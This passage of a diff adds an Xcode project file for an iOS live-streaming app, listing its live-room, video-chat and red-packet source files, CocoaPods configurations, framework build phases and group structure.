+		18F0AE8428C610AE002E696D /* KKLiveViewerInfoModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKLiveViewerInfoModel.m; sourceTree = "<group>"; };
+		18F0AE8628C610AE002E696D /* KKLiveViewerInfoModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKLiveViewerInfoModel.h; sourceTree = "<group>"; };
+		18F0AE8728C610AE002E696D /* KKLiveSocketInfoModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKLiveSocketInfoModel.h; sourceTree = "<group>"; };
+		18F0AE8F28C610AE002E696D /* KKLivebroadcastController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKLivebroadcastController.m; sourceTree = "<group>"; };
+		18F0AE9028C610AE002E696D /* KKLivebroadcastController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKLivebroadcastController.h; sourceTree = "<group>"; };
+		18F0AEA628C610AE002E696D /* KKLiveTelecastView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKLiveTelecastView.h; sourceTree = "<group>"; };
+		18F0AEAA28C610AE002E696D /* KKLiveTelecastView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKLiveTelecastView.m; sourceTree = "<group>"; };
+		18F0AF4228C610AF002E696D /* KKSendRedBagView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKSendRedBagView.h; sourceTree = "<group>"; };
+		18F0AF4328C610AF002E696D /* KKRobRedBagTopCell.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKRobRedBagTopCell.m; sourceTree = "<group>"; };
+		18F0AF4428C610AF002E696D /* KKRobRedBagView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKRobRedBagView.m; sourceTree = "<group>"; };
+		18F0AF4528C610AF002E696D /* KKRobRedBagCell.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKRobRedBagCell.m; sourceTree = "<group>"; };
+		18F0AF4628C610AF002E696D /* KKSendRedBagView.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKSendRedBagView.m; sourceTree = "<group>"; };
+		18F0AF4728C610AF002E696D /* KKRobRedBagView.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKRobRedBagView.h; sourceTree = "<group>"; };
+		18F0AF4828C610AF002E696D /* KKRobRedBagTopCell.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKRobRedBagTopCell.h; sourceTree = "<group>"; };
+		18F0AF4928C610AF002E696D /* KKRobRedBagCell.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKRobRedBagCell.h; sourceTree = "<group>"; };
+		18F0B09C28C610B0002E696D /* KKChatConfig.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKChatConfig.m; sourceTree = "<group>"; };
+		18F0B09E28C610B0002E696D /* KKInfoCache.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKInfoCache.m; sourceTree = "<group>"; };
+		18F0B0A028C610B0002E696D /* KKMyBeautyCache.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKMyBeautyCache.h; sourceTree = "<group>"; };
+		18F0B0A328C610B0002E696D /* KKChatConfig.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKChatConfig.h; sourceTree = "<group>"; };
+		18F0B0A428C610B0002E696D /* KKMyBeautyCache.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKMyBeautyCache.m; sourceTree = "<group>"; };
+		18F0B0A628C610B0002E696D /* KKInfoCache.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKInfoCache.h; sourceTree = "<group>"; };
+		18F0B0AB28C610B0002E696D /* YBToolClass.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = YBToolClass.h; sourceTree = "<group>"; };
+		18F0B0AC28C610B0002E696D /* KKLiveAPI.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKLiveAPI.h; sourceTree = "<group>"; };
+		18F0B0B028C610B0002E696D /* KKHTTPNetWorkTool.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKHTTPNetWorkTool.m; sourceTree = "<group>"; };
+		18F0B0B328C610B0002E696D /* YBToolClass.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = YBToolClass.m; sourceTree = "<group>"; };
+		18F0B0B828C610B0002E696D /* KKLiveAPI.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKLiveAPI.m; sourceTree = "<group>"; };
+		18F0B0BB28C610B0002E696D /* KKHTTPNetWorkTool.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKHTTPNetWorkTool.h; sourceTree = "<group>"; };
+		18F0B0BD28C610B0002E696D /* KKBaseModel.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = KKBaseModel.m; sourceTree = "<group>"; };
+		18F0B0BE28C610B0002E696D /* KKBaseModel.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = KKBaseModel.h; sourceTree = "<group>"; };
+		18F0B5A128C6E13A002E696D /* JX_GCDTimerManager.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = JX_GCDTimerManager.h; sourceTree = "<group>"; };
+		18F0B5A228C6E13A002E696D /* JX_GCDTimerManager.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = JX_GCDTimerManager.m; sourceTree = "<group>"; };
+		18FBEDFF2817FF820069F226 /* Live.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Live.app; sourceTree = BUILT_PRODUCTS_DIR; };
+		18FBEE0E2817FF850069F226 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
+		18FBEE112817FF850069F226 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		18FBEE132817FF850069F226 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		18FBEE142817FF860069F226 /* main.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
+		18FBEE1A2817FF860069F226 /* LiveTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = LiveTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		18FBEE1E2817FF860069F226 /* _1testTests.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = _1testTests.m; sourceTree = "<group>"; };
+		18FBEE202817FF860069F226 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		18FBEE252817FF860069F226 /* LiveUITests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = LiveUITests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
+		18FBEE292817FF860069F226 /* _1testUITests.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = _1testUITests.m; sourceTree = "<group>"; };
+		18FBEE2B2817FF860069F226 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		18FBEE41281800850069F226 /* Live.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = Live.entitlements; sourceTree = "<group>"; };
+		18FBEF6B281803C60069F226 /* PrefixHeader.pch */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = PrefixHeader.pch; sourceTree = "<group>"; };
+		18FBEF81281804DA0069F226 /* AppDelegate.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = AppDelegate.m; sourceTree = "<group>"; };
+		18FBEF82281804DA0069F226 /* SceneDelegate.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = SceneDelegate.h; sourceTree = "<group>"; };
+		18FBEF83281804DA0069F226 /* AppDelegate.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
+		18FBEF84281804DA0069F226 /* SceneDelegate.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = SceneDelegate.m; sourceTree = "<group>"; };
+		18FBF00F281805050069F226 /* LDSearchDeviceViewController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = LDSearchDeviceViewController.h; sourceTree = "<group>"; };
+		18FBF014281805050069F226 /* LDSearchDeviceViewController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = LDSearchDeviceViewController.m; sourceTree = "<group>"; };
+		18FCFA0B28B7067B006A8452 /* TCNavigationController.m */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.objc; path = TCNavigationController.m; sourceTree = "<group>"; };
+		18FCFA0C28B7067B006A8452 /* TCNavigationController.h */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.c.h; path = TCNavigationController.h; sourceTree = "<group>"; };
+		1AF9216FE0150CDF0C5D8D4C /* Pods-Live.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Live.release.xcconfig"; path = "Target Support Files/Pods-Live/Pods-Live.release.xcconfig"; sourceTree = "<group>"; };
+		3CD0F62CC631C0C0BEBC2FE8 /* Pods-LiveTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-LiveTests.debug.xcconfig"; path = "Target Support Files/Pods-LiveTests/Pods-LiveTests.debug.xcconfig"; sourceTree = "<group>"; };
+		491C046225BA543A0226FB21 /* Pods-LiveTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-LiveTests.release.xcconfig"; path = "Target Support Files/Pods-LiveTests/Pods-LiveTests.release.xcconfig"; sourceTree = "<group>"; };
+		57EA01FD2284DF42DFC19797 /* Pods-Live.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Live.debug.xcconfig"; path = "Target Support Files/Pods-Live/Pods-Live.debug.xcconfig"; sourceTree = "<group>"; };
+		D286A0DA691EDC84FDAF2B0D /* Pods_LiveTests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_LiveTests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		DF6488277195013FFDF0989C /* Pods-Live-LiveUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Live-LiveUITests.debug.xcconfig"; path = "Target Support Files/Pods-Live-LiveUITests/Pods-Live-LiveUITests.debug.xcconfig"; sourceTree = "<group>"; };
+		E3611280E36C5C881F46795A /* Pods_Live_LiveUITests.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Live_LiveUITests.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+/* End PBXFileReference section */
+
+/* Begin PBXFrameworksBuildPhase section */
+		18FBEDFC2817FF820069F226 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				BAA40F0832C8C954EB848011 /* Pods_Live.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		18FBEE172817FF860069F226 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				C2D32F4920CCA595D3327065 /* Pods_LiveTests.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+		18FBEE222817FF860069F226 /* Frameworks */ = {
+			isa = PBXFrameworksBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+				61F127706BF044662C60A7E0 /* Pods_Live_LiveUITests.framework in Frameworks */,
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+		};
+/* End PBXFrameworksBuildPhase section */
+
+/* Begin PBXGroup section */
+		09F3FCF7752B98D9837ABAA9 /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				015D1391F5B8D53FBEF7744D /* Pods_Live.framework */,
+				E3611280E36C5C881F46795A /* Pods_Live_LiveUITests.framework */,
+				D286A0DA691EDC84FDAF2B0D /* Pods_LiveTests.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
+		18F0A7CA28C610AA002E696D /* KKClasses */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AD5F28C610AE002E696D /* KKMain */,
+				18F0AD9828C610AE002E696D /* KKFunctionClasses */,
+				18F0B09A28C610B0002E696D /* KKTools */,
+			);
+			path = KKClasses;
+			sourceTree = "<group>";
+		};
+		18F0AD5F28C610AE002E696D /* KKMain */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AD6028C610AE002E696D /* KKCategory */,
+				18F0AD8428C610AE002E696D /* KKSupportingFiles */,
+				18F0AD9328C610AE002E696D /* KKAppConfigure */,
+			);
+			path = KKMain;
+			sourceTree = "<group>";
+		};
+		18F0AD6028C610AE002E696D /* KKCategory */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AD6128C610AE002E696D /* NSURL+KKObjcSugar.h */,
+				18F0AD6328C610AE002E696D /* UIView+KKSugar.h */,
+				18F0AD6528C610AE002E696D /* NSDate+KKObjcSugar.h */,
+				18F0AD6628C610AE002E696D /* UIColor+KKObjcSugar.h */,
+				18F0AD6828C610AE002E696D /* NSString+KKObjcSugar.m */,
+				18F0AD6A28C610AE002E696D /* NSNull+KKObjcSugar.m */,
+				18F0AD6B28C610AE002E696D /* UIButton+KKObjcSugar.h */,
+				18F0AD6F28C610AE002E696D /* UIColor+KKObjcSugar.m */,
+				18F0AD7028C610AE002E696D /* NSDate+KKObjcSugar.m */,
+				18F0AD7228C610AE002E696D /* UIView+KKSugar.m */,
+				18F0AD7328C610AE002E696D /* NSURL+KKObjcSugar.m */,
+				18F0AD7528C610AE002E696D /* NSString+KKObjcSugar.h */,
+				18F0AD7628C610AE002E696D /* NSNull+KKObjcSugar.h */,
+				18F0AD7828C610AE002E696D /* UIButton+KKObjcSugar.m */,
+			);
+			path = KKCategory;
+			sourceTree = "<group>";
+		};
+		18F0AD8428C610AE002E696D /* KKSupportingFiles */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AD8528C610AE002E696D /* KKLiveRoomMoreFunctionAnchorSecondTwoArr.plist */,
+				18F0AD8728C610AE002E696D /* KKGameRoomTopInfo.plist */,
+				18F0AD8828C610AE002E696D /* KKGameRoomMoreFunctionInfo.plist */,
+				18F0AD8B28C610AE002E696D /* KKImage */,
+			);
+			path = KKSupportingFiles;
+			sourceTree = "<group>";
+		};
+		18F0AD8B28C610AE002E696D /* KKImage */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AD8C28C610AE002E696D /* kkUserInfoVC_liveing.gif */,
+			);
+			path = KKImage;
+			sourceTree = "<group>";
+		};
+		18F0AD9328C610AE002E696D /* KKAppConfigure */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AD9428C610AE002E696D /* KKHttpAPIConfigure.h */,
+				18F0AD9528C610AE002E696D /* KKChatMacroDefinition.h */,
+				18F0AD9628C610AE002E696D /* KKAPPInfoConfigure.h */,
+				18F0AD9728C610AE002E696D /* KKMacroDefinition.h */,
+			);
+			path = KKAppConfigure;
+			sourceTree = "<group>";
+		};
+		18F0AD9828C610AE002E696D /* KKFunctionClasses */ = {
+			isa = PBXGroup;
+			children = (
+				18F0ADFD28C610AE002E696D /* KKLive */,
+				18F0AEFB28C610AF002E696D /* KKFunction */,
+			);
+			path = KKFunctionClasses;
+			sourceTree = "<group>";
+		};
+		18F0ADFD28C610AE002E696D /* KKLive */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AE1C28C610AE002E696D /* KKLiveRoom */,
+				18F0AE8E28C610AE002E696D /* KKLivebroadcast */,
+			);
+			path = KKLive;
+			sourceTree = "<group>";
+		};
+		18F0AE1C28C610AE002E696D /* KKLiveRoom */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AE1D28C610AE002E696D /* KKController */,
+				18F0AE2228C610AE002E696D /* KKView */,
+				18F0AE8028C610AE002E696D /* KKModel */,
+			);
+			path = KKLiveRoom;
+			sourceTree = "<group>";
+		};
+		18F0AE1D28C610AE002E696D /* KKController */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AE4128C610AE002E696D /* KKLiveViewerView.m */,
+				18F0AE4C28C610AE002E696D /* KKLiveViewerView.h */,
+				18F0AE3F28C610AE002E696D /* KKLiveRoomScrollView.m */,
+				18F0AE4828C610AE002E696D /* KKLiveRoomScrollView.h */,
+				18F0AE1E28C610AE002E696D /* KKLiveViewerViewController.h */,
+				18F0AE2028C610AE002E696D /* KKLiveViewerViewController.m */,
+			);
+			path = KKController;
+			sourceTree = "<group>";
+		};
+		18F0AE2228C610AE002E696D /* KKView */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AE2328C610AE002E696D /* KKLive */,
+				18F0AE3C28C610AE002E696D /* KKViewer */,
+				18F0AE6328C610AE002E696D /* KKHorizontal */,
+				18F0AE7528C610AE002E696D /* KKLiveRoomAnimationView */,
+			);
+			path = KKView;
+			sourceTree = "<group>";
+		};
+		18F0AE2328C610AE002E696D /* KKLive */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AE2728C610AE002E696D /* KKTRTCChatTableViewCell.m */,
+				18F0AE2828C610AE002E696D /* KKTRTCLiveInvitationView.m */,
+				18F0AE2C28C610AE002E696D /* KKTRTCLiveInvitationView.h */,
+				18F0AE2D28C610AE002E696D /* KKTRTCChatTableViewCell.h */,
+				18F0AE3028C610AE002E696D /* KKTRTC */,
+			);
+			path = KKLive;
+			sourceTree = "<group>";
+		};
+		18F0AE3028C610AE002E696D /* KKTRTC */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AE3128C610AE002E696D /* KKLiveRoomUserOnlineView.m */,
+				18F0AE3228C610AE002E696D /* KKRoomOnlinePersonCell.m */,
+				18F0AE3328C610AE002E696D /* KKTRTCChoiceVideoCell.m */,
+				18F0AE3428C610AE002E696D /* KKTRTCVideoView.m */,
+				18F0AE3528C610AE002E696D /* KKTRTCChoiceVideoView.m */,
+				18F0AE3628C610AE002E696D /* KKLiveRoomUserOnlineView.h */,
+				18F0AE3728C610AE002E696D /* KKRoomOnlinePersonCell.h */,
+				18F0AE3828C610AE002E696D /* KKTRTCChoiceVideoCell.h */,
+				18F0AE3928C610AE002E696D /* KKTRTCChoiceVideoView.h */,
+				18F0AE3A28C610AE002E696D /* KKTRTCVideoView.h */,
+			);
+			path = KKTRTC;
+			sourceTree = "<group>";
+		};
+		18F0AE3C28C610AE002E696D /* KKViewer */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AE3D28C610AE002E696D /* KKUserInfoView.h */,
+				18F0AE3E28C610AE002E696D /* KKSocketChatView.m */,
+				18F0AE4028C610AE002E696D /* KKTRTCVoiceCollectionViewCell.h */,
+				18F0AE4228C610AE002E696D /* KKTRTCVoiceView.m */,
+				18F0AE4328C610AE002E696D /* KKLiveBottomMenuView.h */,
+				18F0AE4428C610AE002E696D /* KKLiveVideoView.h */,
+				18F0AE4528C610AE002E696D /* KKLiveRoomActivityView.m */,
+				18F0AE4628C610AE002E696D /* KKUserInfoView.m */,
+				18F0AE4728C610AE002E696D /* KKTRTCVoiceCollectionViewCell.m */,
+				18F0AE4928C610AE002E696D /* KKSocketChatView.h */,
+				18F0AE4A28C610AE002E696D /* KKTRTCVoiceView.h */,
+				18F0AE4B28C610AE002E696D /* KKLiveBottomMenuView.m */,
+				18F0AE4D28C610AE002E696D /* KKLiveRoomActivityView.h */,
+				18F0AE4E28C610AE002E696D /* KKLiveVideoView.m */,
+			);
+			path = KKViewer;
+			sourceTree = "<group>";
+		};
+		18F0AE6328C610AE002E696D /* KKHorizontal */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AE6428C610AE002E696D /* KKTextToolBar.m */,
+				18F0AE6528C610AE002E696D /* KKHorizontalUserInfoView.m */,
+				18F0AE6628C610AE002E696D /* KKHorizontalView.h */,
+				18F0AE6728C610AE002E696D /* KKTextToolBar.h */,
+				18F0AE6828C610AE002E696D /* KKHorizontalUserInfoView.h */,
+				18F0AE6928C610AE002E696D /* KKHorizontalView.m */,
+			);
+			path = KKHorizontal;
+			sourceTree = "<group>";
+		};
+		18F0AE7528C610AE002E696D /* KKLiveRoomAnimationView */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AE7628C610AE002E696D /* KKCommendatoryLiveRoomView.m */,
+				18F0AE7728C610AE002E696D /* KKCommendatoryLiveRoomCell.m */,
+				18F0AE7828C610AE002E696D /* KKLotteryAnimationView.m */,
+				18F0AE7928C610AE002E696D /* KKShowRoomTitleView.m */,
+				18F0AE7A28C610AE002E696D /* KKLiveUserComeRoomAnimationView.h */,
+				18F0AE7B28C610AE002E696D /* KKCommendatoryLiveRoomView.h */,
+				18F0AE7C28C610AE002E696D /* KKCommendatoryLiveRoomCell.h */,
+				18F0AE7D28C610AE002E696D /* KKLotteryAnimationView.h */,
+				18F0AE7E28C610AE002E696D /* KKLiveUserComeRoomAnimationView.m */,
+				18F0AE7F28C610AE002E696D /* KKShowRoomTitleView.h */,
+			);
+			path = KKLiveRoomAnimationView;
+			sourceTree = "<group>";
+		};
+		18F0AE8028C610AE002E696D /* KKModel */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AE8328C610AE002E696D /* KKLiveSocketInfoModel.m */,
+				18F0AE8428C610AE002E696D /* KKLiveViewerInfoModel.m */,
+				18F0AE8628C610AE002E696D /* KKLiveViewerInfoModel.h */,
+				18F0AE8728C610AE002E696D /* KKLiveSocketInfoModel.h */,
+			);
+			path = KKModel;
+			sourceTree = "<group>";
+		};
+		18F0AE8E28C610AE002E696D /* KKLivebroadcast */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AEA628C610AE002E696D /* KKLiveTelecastView.h */,
+				18F0AEAA28C610AE002E696D /* KKLiveTelecastView.m */,
+				18F0AE8F28C610AE002E696D /* KKLivebroadcastController.m */,
+				18F0AE9028C610AE002E696D /* KKLivebroadcastController.h */,
+			);
+			path = KKLivebroadcast;
+			sourceTree = "<group>";
+		};
+		18F0AEFB28C610AF002E696D /* KKFunction */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AF4128C610AF002E696D /* RedBag */,
+			);
+			path = KKFunction;
+			sourceTree = "<group>";
+		};
+		18F0AF4128C610AF002E696D /* RedBag */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AF4228C610AF002E696D /* KKSendRedBagView.h */,
+				18F0AF4328C610AF002E696D /* KKRobRedBagTopCell.m */,
+				18F0AF4428C610AF002E696D /* KKRobRedBagView.m */,
+				18F0AF4528C610AF002E696D /* KKRobRedBagCell.m */,
+				18F0AF4628C610AF002E696D /* KKSendRedBagView.m */,
+				18F0AF4728C610AF002E696D /* KKRobRedBagView.h */,
+				18F0AF4828C610AF002E696D /* KKRobRedBagTopCell.h */,
+				18F0AF4928C610AF002E696D /* KKRobRedBagCell.h */,
+			);
+			path = RedBag;
+			sourceTree = "<group>";
+		};
+		18F0B09A28C610B0002E696D /* KKTools */ = {
+			isa = PBXGroup;
+			children = (
+				18F0B5A028C6E13A002E696D /* JX_GCDTimer */,
+				18F0B09B28C610B0002E696D /* KKUserInfoCache */,
+				18F0B0A828C610B0002E696D /* KKNetWorkTool */,
+				18F0B0BD28C610B0002E696D /* KKBaseModel.m */,
+				18F0B0BE28C610B0002E696D /* KKBaseModel.h */,
+			);
+			path = KKTools;
+			sourceTree = "<group>";
+		};
+		18F0B09B28C610B0002E696D /* KKUserInfoCache */ = {
+			isa = PBXGroup;
+			children = (
+				18F0B09C28C610B0002E696D /* KKChatConfig.m */,
+				18F0B09E28C610B0002E696D /* KKInfoCache.m */,
+				18F0B0A028C610B0002E696D /* KKMyBeautyCache.h */,
+				18F0B0A328C610B0002E696D /* KKChatConfig.h */,
+				18F0B0A428C610B0002E696D /* KKMyBeautyCache.m */,
+				18F0B0A628C610B0002E696D /* KKInfoCache.h */,
+			);
+			path = KKUserInfoCache;
+			sourceTree = "<group>";
+		};
+		18F0B0A828C610B0002E696D /* KKNetWorkTool */ = {
+			isa = PBXGroup;
+			children = (
+				18F0B0AB28C610B0002E696D /* YBToolClass.h */,
+				18F0B0AC28C610B0002E696D /* KKLiveAPI.h */,
+				18F0B0B028C610B0002E696D /* KKHTTPNetWorkTool.m */,
+				18F0B0B328C610B0002E696D /* YBToolClass.m */,
+				18F0B0B828C610B0002E696D /* KKLiveAPI.m */,
+				18F0B0BB28C610B0002E696D /* KKHTTPNetWorkTool.h */,
+			);
+			path = KKNetWorkTool;
+			sourceTree = "<group>";
+		};
+		18F0B5A028C6E13A002E696D /* JX_GCDTimer */ = {
+			isa = PBXGroup;
+			children = (
+				18F0B5A128C6E13A002E696D /* JX_GCDTimerManager.h */,
+				18F0B5A228C6E13A002E696D /* JX_GCDTimerManager.m */,
+			);
+			path = JX_GCDTimer;
+			sourceTree = "<group>";
+		};
+		18FBEDF62817FF820069F226 = {
+			isa = PBXGroup;
+			children = (
+				18FBEE012817FF820069F226 /* Live */,
+				18FBEE1D2817FF860069F226 /* LiveTests */,
+				18FBEE282817FF860069F226 /* LiveUITests */,
+				18FBEE002817FF820069F226 /* Products */,
+				F37D05547ECB471DB35A7B4A /* Pods */,
+				09F3FCF7752B98D9837ABAA9 /* Frameworks */,
+			);
+			sourceTree = "<group>";
+		};
+		18FBEE002817FF820069F226 /* Products */ = {
+			isa = PBXGroup;
+			children = (
+				18FBEDFF2817FF820069F226 /* Live.app */,
+				18FBEE1A2817FF860069F226 /* LiveTests.xctest */,
+				18FBEE252817FF860069F226 /* LiveUITests.xctest */,
+			);
+			name = Products;
+			sourceTree = "<group>";
+		};
+		18FBEE012817FF820069F226 /* Live */ = {
+			isa = PBXGroup;
+			children = (
+				18F0A7CA28C610AA002E696D /* KKClasses */,
+				18FBEFB4281805050069F226 /* base */,
+				18FBEF83281804DA0069F226 /* AppDelegate.h */,
+				18FBEF81281804DA0069F226 /* AppDelegate.m */,
+				18FBEF82281804DA0069F226 /* SceneDelegate.h */,
+				18FBEF84281804DA0069F226 /* SceneDelegate.m */,
+				18FBEE41281800850069F226 /* Live.entitlements */,
+				18FBEF6B281803C60069F226 /* PrefixHeader.pch */,
+				18FBEE0E2817FF850069F226 /* Assets.xcassets */,
+				18FBEE102817FF850069F226 /* LaunchScreen.storyboard */,
+				18FBEE132817FF850069F226 /* Info.plist */,
+				18FBEE142817FF860069F226 /* main.m */,
+			);
+			path = Live;
+			sourceTree = "<group>";
+		};
+		18FBEE1D2817FF860069F226 /* LiveTests */ = {
+			isa = PBXGroup;
+			children = (
+				18FBEE1E2817FF860069F226 /* _1testTests.m */,
+				18FBEE202817FF860069F226 /* Info.plist */,
+			);
+			path = LiveTests;
+			sourceTree = "<group>";
+		};
+		18FBEE282817FF860069F226 /* LiveUITests */ = {
+			isa = PBXGroup;
+			children = (
+				18FBEE292817FF860069F226 /* _1testUITests.m */,
+				18FBEE2B2817FF860069F226 /* Info.plist */,
+			);
+			path = LiveUITests;
+			sourceTree = "<group>";
+		};
+		18FBEFB4281805050069F226 /* base */ = {
+			isa = PBXGroup;
+			children = (
+				18F0AD9128C610AE002E696D /* YBBaseViewController.m */,
+				18F0AD9228C610AE002E696D /* YBBaseViewController.h */,
+				18FCFA0C28B7067B006A8452 /* TCNavigationController.h */,
+				18FCFA0B28B7067B006A8452 /* TCNavigationController.m */,
+				18FBF00F281805050069F226 /* LDSearchDeviceViewController.h */,
+				18FBF014281805050069F226 /* LDSearchDeviceViewController.m */,
+			);
+			path = base;
+			sourceTree = "<group>";
+		};
+		F37D05547ECB471DB35A7B4A /* Pods */ = {
+			isa = PBXGroup;
+			children = (
+				57EA01FD2284DF42DFC19797 /* Pods-Live.debug.xcconfig */,
+				1AF9216FE0150CDF0C5D8D4C /* Pods-Live.release.xcconfig */,
+				DF6488277195013FFDF0989C /* Pods-Live-LiveUITests.debug.xcconfig */,
+				0C0076CA632740093C4D7F39 /* Pods-Live-LiveUITests.release.xcconfig */,
+				3CD0F62CC631C0C0BEBC2FE8 /* Pods-LiveTests.debug.xcconfig */,
+				491C046225BA543A0226FB21 /* Pods-LiveTests.release.xcconfig */,
+			);
+			path = Pods;
+			sourceTree = "<group>";
+		};
+/* End PBXGroup section */
+
